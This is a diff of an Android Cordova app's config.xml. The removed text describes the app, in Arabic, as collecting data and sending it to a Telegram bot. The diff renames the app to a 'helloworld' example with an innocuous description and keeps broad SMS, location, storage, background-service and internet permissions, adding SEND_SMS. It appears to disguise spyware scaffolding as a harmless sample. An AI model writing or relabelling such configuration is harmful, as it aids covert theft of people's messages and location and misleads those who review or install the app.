@@ -1,15 +1,17 @@
 <?xml version='1.0' encoding='utf-8'?>
-<widget id="com.example.datacollector" version="1.0.0" xmlns="http://www.w3.org/ns/widgets" xmlns:cdv="http://cordova.apache.org/ns/1.0">
-  <name>DataCollector</name>
+<widget id="com.example.helloworld" version="1.0.0" xmlns="http://www.w3.org/ns/widgets" xmlns:cdv="http://cordova.apache.org/ns/1.0">
+  <name>CordovaApp</name>
   <description>
-    تطبيق لجمع البيانات وإرسالها إلى بوت Telegram
+    مثال على تطبيق Cordova يطلب أذونات الملفات وSMS.
   </description>
-  <author email="dev@example.com">Anonymous Developer</author>
+  <author email="dev@example.com">Cordova Developer</author>
   <content src="index.html" />
   <access origin="*" />
-  <preference name="android-targetSdkVersion" value="34" />
+  <preference name="android-targetSdkVersion" value="29" />
+  <preference name="android-minSdkVersion" value="22" />
   <preference name="KeepRunning" value="true" />
   
+  <!-- Plugins الأساسية -->
   <plugin name="cordova-plugin-whitelist" spec="1" />
   <plugin name="cordova-plugin-geolocation" spec="4.1.0" />
   <plugin name="cordova-plugin-sms" spec="1.0.5" />
@@ -22,20 +24,33 @@
   <platform name="android">
     <edit-config file="AndroidManifest.xml" mode="merge" target="/manifest">
       <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+        <!-- الصلاحيات الأساسية -->
         <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
         <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+        <uses-permission android:name="android.permission.SEND_SMS" />
         <uses-permission android:name="android.permission.READ_SMS" />
         <uses-permission android:name="android.permission.RECEIVE_SMS" />
+        
+        <!-- لخدمة الخلفية -->
+        <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+        
+        <!-- لسحب الموقع -->
         <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
         <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-        <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-        <uses-permission android:name="android.permission.CAMERA" />
+        
+        <!-- للاتصال بالإنترنت -->
         <uses-permission android:name="android.permission.INTERNET" />
+        <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
         
         <application>
           <service android:name="org.apache.cordova.background.BackgroundPlugin$BackgroundService" />
         </application>
       </manifest>
     </edit-config>
+    
+    <!-- إعدادات إضافية لتشغيل الخلفية -->
+    <config-file parent="/*" target="AndroidManifest.xml">
+      <uses-permission android:name="android.permission.WAKE_LOCK" />
+    </config-file>
   </platform>
 </widget>
